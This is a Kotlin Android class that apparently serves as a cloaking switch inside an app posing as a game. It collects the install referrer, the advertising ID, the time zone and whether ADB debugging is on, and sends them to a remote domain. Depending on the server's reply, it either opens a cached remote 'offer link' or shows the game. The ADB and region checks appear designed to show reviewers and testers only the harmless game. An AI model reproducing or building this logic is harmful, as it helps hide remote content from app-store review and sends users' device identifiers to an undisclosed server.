package com.missclick.logicref

import android.content.Context
import android.provider.Settings
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.facebook.FacebookSdk
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.URL
import java.net.URLEncoder
import java.util.*

class LogicRef(val context : Context) {


    fun start(domain : String,fileName : String,refKey : String, adKey : String, adbKey : String, timeZoneKey : String, offerLinkKey : String , osId : String, fbId: String, fbSecret : String, toView : (String) -> Unit, toGame : () -> Unit){

        FacebookSdk.setApplicationId(fbId)
        FacebookSdk.setClientToken(fbSecret)
        FacebookSdk.sdkInitialize(context)
        OneSignal.initWithContext(context)
        OneSignal.setAppId(osId)


        val shared = context.getSharedPreferences(fileName,0)
        val inMemory = shared.getString(fileName,fileName)!!
        if (inMemory != fileName){
            toView(inMemory)
        }else{
            val tmz = TimeZone.getDefault().id
            val adb = Settings.Secure.getInt(context.contentResolver, Settings.Global.ADB_ENABLED , 0) == 1
            val installRef = InstallReferrerClient.newBuilder(context).build()
            installRef.startConnection(object :
                InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    val ref2 = if(responseCode == 0) URLEncoder.encode(installRef.installReferrer.installReferrer, "UTF-8") else null
                    installRef.endConnection()
                    GlobalScope.launch(Dispatchers.IO) {
                        val adId = AdvertisingIdClient.getAdvertisingIdInfo(context).id
                        OneSignal.setExternalUserId(adId.toString())
                        val link = "https://$domain/$fileName.php?$refKey=$ref2&$adKey=$adId&$adbKey=$adb&$timeZoneKey=$tmz"
                        println(link)
                        try {
                            val ans = URL(link).readText()
                            val parsed = JSONObject(ans).get(offerLinkKey).toString()
                            withContext(Dispatchers.Main){
                                if (parsed == "null"){

                                    toGame.invoke()
                                }else{
                                    shared.edit().putString(fileName,parsed).apply()
                                    toView(parsed)
                                }
                            }

                        }catch (th : Throwable){
                            withContext(Dispatchers.Main) {
                                toGame.invoke()
                            }
                        }

                    }
                }

                override fun onInstallReferrerServiceDisconnected() {
                }
            })
        }

    }

}